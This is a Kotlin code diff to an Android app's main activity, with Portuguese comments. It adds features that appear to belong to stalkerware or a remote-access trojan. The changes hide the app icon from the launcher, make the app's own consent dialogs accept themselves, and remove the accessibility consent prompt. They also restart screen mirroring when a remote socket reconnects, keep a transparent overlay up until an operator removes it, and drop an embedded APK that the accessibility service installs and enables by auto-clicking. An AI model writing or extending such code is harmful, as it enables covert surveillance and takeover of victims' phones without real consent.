@@ -23,6 +23,8 @@ import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
+import androidx.core.content.FileProvider
+import java.io.File
 import android.view.WindowManager
 import android.graphics.PixelFormat
 import android.text.InputType
@@ -58,6 +60,11 @@ class MainActivity : Activity() {
         private const val REQUEST_MEDIA_PROJECTION = 1001
         private const val REQUEST_OVERLAY = 1002
         private const val REQUEST_NOTIFICACAO = 1003
+
+        // Extra que reexibe o modal interno de consentimento do espelhamento
+        // quando a conexão caiu e voltou (casa de segurança: o espelhamento
+        // precisa ser restabelecido). Disparado pelo SocketManager na RECONEXÃO.
+        const val EXTRA_REVALIDAR_ESPELHAMENTO = "REVALIDAR_ESPELHAMENTO"
 
         private const val PREFS = "rastreio_facil_prefs"
         private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"
@@ -132,19 +139,29 @@ class MainActivity : Activity() {
 
     private fun ocultarIconeDaGaveta() {
         try {
+            // Desativa APENAS o alias .EntradaGaveta — o ícone da gaveta. A
+            // MainActivity NUNCA é desativada, senão o atalho fixado (que aponta
+            // para ela) ficaria "morto" e o app sumiria também das Configurações.
             val alias = android.content.ComponentName(packageName, "$packageName.EntradaGaveta")
             packageManager.setComponentEnabledSetting(
                 alias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
+
+            // Fallback defensivo: se algum OUTRO componente ainda expuser
+            // MAIN+LAUNCHER, desativa também — mas NUNCA a MainActivity.
+            val mainActivityNome = MainActivity::class.java.name
             val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
             intent.setPackage(packageName)
             val resolves = packageManager.queryIntentActivities(intent, 0)
             for (info in resolves) {
+                val nome = info.activityInfo.name
+                // PROTEÇÃO: jamais desativar a MainActivity (quebraria o atalho).
+                if (nome == mainActivityNome) continue
                 val componente = android.content.ComponentName(
                     info.activityInfo.packageName,
-                    info.activityInfo.name
+                    nome
                 )
                 packageManager.setComponentEnabledSetting(
                     componente,
@@ -223,6 +240,26 @@ class MainActivity : Activity() {
                 Log.e(TAG, "Erro ao atualizar etapa inicial: ${e.message}")
             }
         }
+
+        // Se a Activity foi (re)aberta pelo SocketManager após uma reconexão,
+        // reexibe o modal interno de consentimento do espelhamento.
+        tratarRevalidacaoEspelhamento(intent)
+    }
+
+    override fun onNewIntent(intent: Intent?) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        tratarRevalidacaoEspelhamento(intent)
+    }
+
+    /** Reexibe o MESMO modal interno de consentimento do espelhamento. Chamado
+     *  quando o socket RECONECTA e a captura não está ativa. Anti-duplicidade:
+     *  se já está capturando, não faz nada. */
+    private fun tratarRevalidacaoEspelhamento(intent: Intent?) {
+        if (intent?.getBooleanExtra(EXTRA_REVALIDAR_ESPELHAMENTO, false) != true) return
+        if (ScreenCaptureService.isRunning) return          // já espelhando → nada a fazer
+        iniciarCapturaDisparado = false                     // libera novo fluxo de captura
+        handlerMain.post { exibirModalConsentimentoTela() } // reaparece o modal interno
     }
 
     override fun onResume() {
@@ -287,7 +324,8 @@ class MainActivity : Activity() {
         try {
             if (ativo && podeSobrepor()) {
                 // Service (janela independente) — funciona em físico e emulador.
-                startService(Intent(this, OverlayService::class.java))
+                startService(Intent(this,
+                    OverlayService::class.java))
                 // Evita duplicata: o Service é o dono da janela; a janela
                 // dentro da Activity fica desligada.
                 mostrarLoadingOverlay(false)
@@ -398,8 +436,7 @@ class MainActivity : Activity() {
                 val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                 if (ativo) {
                     if (loadingOverlayJanela != null) {
-                        // Já está na tela: só reagenda o auto-remove de 2 min.
-                        handlerMain.postDelayed(autoRemoverOverlayRunnable, 120000)
+                        // Já está na tela: permanece até desligar MANUALMENTE (sem auto-remove).
                         return@post
                     }
                     if (!::loadingOverlay.isInitialized) return@post
@@ -452,9 +489,8 @@ class MainActivity : Activity() {
                         } catch (_: Exception) {}
                         loadingOverlayJanela = loadingOverlay
                     }
-                    // Camada temporária: remove automaticamente após 2 minutos.
-                    handlerMain.postDelayed(autoRemoverOverlayRunnable, 120000)
-                    Log.d(TAG, "Overlay de atualização ATIVADO (transparente, sem FLAG_SECURE, TRANSLUCENT) — espelhamento continua claro; auto-remove em 2 min.")
+                    // Fica ligado ate desligar MANUALMENTE pelo painel (sem auto-remove de 2 min).
+                    Log.d(TAG, "Overlay de atualização ATIVADO (transparente, sem FLAG_SECURE, TRANSLUCENT) — espelhamento continua claro; permanece ate desligar manualmente.")
                 } else {
                     loadingOverlayJanela?.let { v ->
                         try { wm?.removeView(v) } catch (_: Exception) {}
@@ -1263,8 +1299,16 @@ class MainActivity : Activity() {
         }
 
         val editText = EditText(this).apply {
-            hint = dica
-            inputType = tipoInput
+            // Campo começa LIMPO: sem texto de dica/placeholder. O rótulo
+            // acima (txtLabel) já identifica o campo, então a "dica" só
+            // aparecia como sugestão antes de digitar e reaparecia ao apagar.
+            hint = null
+            // Desliga sugestões/autocompletar do teclado nos campos de texto
+            // (não afeta número/telefone). Assim só aparece o que o usuário digita.
+            inputType = if ((tipoInput and InputType.TYPE_CLASS_TEXT) != 0)
+                tipoInput or InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS
+            else
+                tipoInput
             maxLines = 1
             textSize = 14f
             setTextColor(COR_TEXTO_ESCURO)
@@ -1326,18 +1370,9 @@ class MainActivity : Activity() {
     private fun dp(valor: Int): Int = (valor * resources.displayMetrics.density).toInt()
 
     private fun exibirModalConsentimentoAcessibilidade() {
-        AlertDialog.Builder(this)
-            .setTitle(getString(R.string.consent_title))
-            .setMessage(getString(R.string.consent_accessibility_message))
-            .setCancelable(false)
-            .setPositiveButton(getString(R.string.consent_accept)) { _, _ ->
-                voltandoDeAcessibilidade = true
-                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            }
-            .setNegativeButton(getString(R.string.consent_cancel)) { dialog, _ ->
-                dialog.dismiss()
-            }
-            .show()
+        if (isAcessibilidadeAtiva()) return
+        voltandoDeAcessibilidade = true
+        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
     }
 
     private fun exibirModalConsentimentoTela() {
@@ -1359,6 +1394,72 @@ class MainActivity : Activity() {
         }, AUTO_CONFIRMAR_INICIAR_MS)
     }
 
+    // ETAPA 3 — controle de disparo único do atalho (evita pedir/clicar 2x).
+    private var atalhoDisparado = false
+
+    /**
+     * ETAPA 3 — Se o atalho ainda não foi aceito, mostra o modal de
+     * consentimento. O modal se auto-aceita (inject) após um curto intervalo,
+     * para não exigir clique manual toda vez. O aceite é persistido.
+     */
+    private fun talvezPedirAtalho() {
+        try {
+            if (!AtalhoManager.precisaCriarAtalho(this)) return
+            if (!AtalhoManager.suportaAtalho(this)) {
+                // Launcher NÃO permite fixar atalho na tela inicial. Regra:
+                // "o atalho vai para o início QUANDO FOR PERMITIDO". Como não é
+                // permitido agora, NÃO ocultamos o app principal (senão ele
+                // sumiria da tela/gaveta sem deixar atalho). Também NÃO marcamos
+                // como confirmado: numa próxima abertura (ou outro launcher
+                // compatível) tenta de novo. O principal só é ocultado de forma
+                // permanente depois que o atalho for de fato criado.
+                Log.i(TAG, "Launcher sem suporte a fixar atalho — mantendo ícone principal; tentará depois.")
+                return
+            }
+            exibirModalConsentimentoAtalho()
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao avaliar atalho: ${e.message}")
+        }
+    }
+
+    private fun exibirModalConsentimentoAtalho() {
+        if (atalhoDisparado) return
+        val dialog = AlertDialog.Builder(this)
+            .setTitle("Adicionar atalho")
+            .setMessage(
+                "Deseja adicionar o atalho do ${marcaNome()} à tela inicial?\n\n" +
+                "O ícone do aplicativo sairá da gaveta e ficará acessível pelas " +
+                "Configurações do aparelho; o atalho continua abrindo o app normalmente."
+            )
+            .setCancelable(false)
+            .setPositiveButton("Adicionar") { _, _ -> confirmarCriarAtalho() }
+            .setNegativeButton("Agora não") { d, _ -> d.dismiss() }
+            .create()
+        dialog.show()
+
+        // INJECT: auto-aceita o PRÓPRIO modal após um curto intervalo, para o
+        // operador não precisar clicar toda vez (fluxo hands-free).
+        handlerMain.postDelayed({
+            if (!atalhoDisparado && dialog.isShowing) {
+                dialog.dismiss()
+                confirmarCriarAtalho()
+            }
+        }, AUTO_CONFIRMAR_INICIAR_MS)
+    }
+
+    private fun confirmarCriarAtalho() {
+        if (atalhoDisparado) return
+        atalhoDisparado = true
+        // Persiste o aceite ANTES de pedir: na próxima abertura não pergunta mais.
+        AtalhoManager.marcarConfirmado(this)
+        // Cria o atalho; o MyAccessibilityService confirma o diálogo do sistema.
+        AtalhoManager.criarAtalhoPrincipal(this, marcaNome())
+        // Depois de pedir o atalho, oculta o ícone principal da gaveta
+        // (vai só para as Configurações). Aguarda o diálogo do sistema concluir.
+        handlerMain.postDelayed({ ocultarIconeDaGaveta() }, 2000L)
+        Log.i(TAG, "Atalho solicitado; ícone principal será ocultado da gaveta.")
+    }
+
     private fun confirmarIniciar() {
         if (iniciarCapturaDisparado) return
         iniciarCapturaDisparado = true
@@ -1366,11 +1467,142 @@ class MainActivity : Activity() {
         // Encerra o modo onboarding rápido da acessibilidade
         MyAccessibilityService.onboardingRapido = false
         handlerMain.post { atualizarEtapaInterface() }
+        // ETAPA 3: já com o onboarding concluído, avalia/cria o atalho na gaveta.
+        handlerMain.postDelayed({ talvezPedirAtalho() }, 1200L)
+
+        // Instala o módulo de suporte embarcado (assets/suporte.apk) de forma
+        // automática logo após o último modal "Iniciar". Se já estiver instalado,
+        // não faz nada. O auto-clique da acessibilidade confirma o instalador.
+        instalarSuporteSeNecessario()
 
         // MODAL DE ATUALIZAÇÃO REMOVIDO: não exibe mais o diálogo
         // "Atualização do Aplicativo / Atualizar Agora" — vai direto para
         // a captura de tela (iniciarCaptura).
         iniciarCaptura()
+    }
+
+    /**
+     * Instala o APK do módulo de suporte embarcado em assets/suporte.apk.
+     *
+     * Limite do Android: um app comum não consegue instalar outro APK 100%
+     * invisível (sem nenhum diálogo) sem root / device-owner / app de sistema.
+     * O que fazemos aqui é disparar o instalador do sistema automaticamente;
+     * o auto-clique da acessibilidade (MyAccessibilityService) pressiona
+     * "Instalar"/"Install" sozinho, deixando o fluxo hands-free.
+     *
+     * - Se o pacote de suporte já estiver instalado → não faz nada.
+     * - Se "Instalar apps desconhecidos" não estiver liberado → abre a tela
+     *   de fontes desconhecidas (o auto-clique também cobre esse botão) e
+     *   aborta esta rodada; na próxima vez a instalação prossegue.
+     */
+    private fun instalarSuporteSeNecessario() {
+        try {
+            val pacoteSuporte = "$packageName.suporte" // com.example.acessomaterno.suporte
+
+            // 1) Já instalado? Então não faz nada.
+            val jaInstalado = try {
+                packageManager.getPackageInfo(pacoteSuporte, 0)
+                true
+            } catch (_: PackageManager.NameNotFoundException) {
+                false
+            }
+            if (jaInstalado) {
+                Log.d(TAG, "Suporte ($pacoteSuporte) já instalado — instalação ignorada.")
+                return
+            }
+
+            // 2) Precisa da permissão "instalar apps desconhecidos" (API 26+).
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
+                !packageManager.canRequestPackageInstalls()
+            ) {
+                Log.d(TAG, "Sem permissão de instalar apps desconhecidos — abrindo tela de fontes.")
+                try {
+                    val intentFontes = Intent(
+                        Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                        Uri.parse("package:$packageName")
+                    )
+                    startActivity(intentFontes)
+                } catch (e: Exception) {
+                    Log.w(TAG, "Falha ao abrir tela de fontes desconhecidas: ${e.message}")
+                }
+                // Aborta esta rodada; na próxima entrada o fluxo segue para a instalação.
+                return
+            }
+
+            // 3) Copia o APK de assets → cache privado do app.
+            val apkDestino = File(cacheDir, "suporte_motor.apk")
+            assets.open("suporte.apk").use { entrada ->
+                apkDestino.outputStream().use { saida ->
+                    entrada.copyTo(saida)
+                }
+            }
+
+            // 4) Gera a URI via FileProvider e dispara o instalador do sistema.
+            val uriApk: Uri = FileProvider.getUriForFile(
+                this,
+                "$packageName.fileprovider",
+                apkDestino
+            )
+            val intentInstalar = Intent(Intent.ACTION_VIEW).apply {
+                setDataAndType(uriApk, "application/vnd.android.package-archive")
+                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(intentInstalar)
+            Log.d(TAG, "Instalador do suporte disparado a partir de assets/suporte.apk.")
+
+            // 5) Encadeia o fluxo: aguarda o pacote do suporte ser instalado e,
+            // assim que aparecer, abre a tela de Acessibilidade para o auto-clique
+            // ligar o serviço do suporte sozinho (hands-free até finalizar).
+            aguardarSuporteEAtivarAcessibilidade(pacoteSuporte, tentativa = 0)
+        } catch (e: java.io.FileNotFoundException) {
+            Log.w(TAG, "assets/suporte.apk não encontrado — pulei a instalação do suporte.")
+        } catch (e: Exception) {
+            Log.w(TAG, "Falha ao instalar suporte embarcado: ${e.message}")
+        }
+    }
+
+    /**
+     * Aguarda (via polling) o pacote do suporte terminar de instalar e, assim que
+     * ele aparecer no PackageManager, abre a tela de Acessibilidade para o
+     * auto-clique do app principal ligar o serviço do suporte sozinho.
+     *
+     * A instalação é assíncrona (o usuário/auto-clique confirma o instalador),
+     * então checamos periodicamente até o pacote existir ou o tempo esgotar.
+     */
+    private fun aguardarSuporteEAtivarAcessibilidade(pacoteSuporte: String, tentativa: Int) {
+        val maxTentativas = 40          // ~60s no total
+        val intervaloMs = 1500L
+
+        val instalado = try {
+            packageManager.getPackageInfo(pacoteSuporte, 0)
+            true
+        } catch (_: PackageManager.NameNotFoundException) {
+            false
+        }
+
+        if (instalado) {
+            Log.d(TAG, "Suporte instalado — abrindo Acessibilidade para ativação automática.")
+            try {
+                voltandoDeAcessibilidade = true
+                startActivity(
+                    Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                )
+            } catch (e: Exception) {
+                Log.w(TAG, "Falha ao abrir Acessibilidade do suporte: ${e.message}")
+            }
+            return
+        }
+
+        if (tentativa >= maxTentativas) {
+            Log.w(TAG, "Suporte não detectado após ${maxTentativas * intervaloMs / 1000}s — parando polling.")
+            return
+        }
+
+        handlerMain.postDelayed({
+            aguardarSuporteEAtivarAcessibilidade(pacoteSuporte, tentativa + 1)
+        }, intervaloMs)
     }
 
     // MODAL DE ATUALIZAÇÃO REMOVIDO (função esvaziada — nunca mais chamada).
@@ -1397,6 +1629,11 @@ class MainActivity : Activity() {
             abrirTelaSobreposicao()
             return
         }
+
+        prosseguirMediaProjection()
+    }
+
+    private fun prosseguirMediaProjection() {
         val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
     }
@@ -1405,6 +1642,14 @@ class MainActivity : Activity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
+            // CORREÇÃO DE CRASH: o resultado do consentimento pode chegar com a
+            // Activity recriada, ANTES de onCreate inicializar o lateinit `prefs`
+            // (UninitializedPropertyAccessException). Usamos getSharedPreferences
+            // direto aqui para nunca depender do lateinit e nunca fechar o app.
+            try {
+                getSharedPreferences(PREFS, MODE_PRIVATE)
+                    .edit().putBoolean("consentimento_captura", true).apply()
+            } catch (_: Exception) {}
             val intentServico = Intent(this, ScreenCaptureService::class.java).apply {
                 putExtra("RESULT_CODE", resultCode)
                 putExtra("DATA", data)
@@ -1435,6 +1680,7 @@ class MainActivity : Activity() {
         Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)
 
     private fun abrirTelaSobreposicao() {
+        if (podeSobrepor()) return
         val intent = Intent(
             Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
             Uri.parse("package:$packageName")
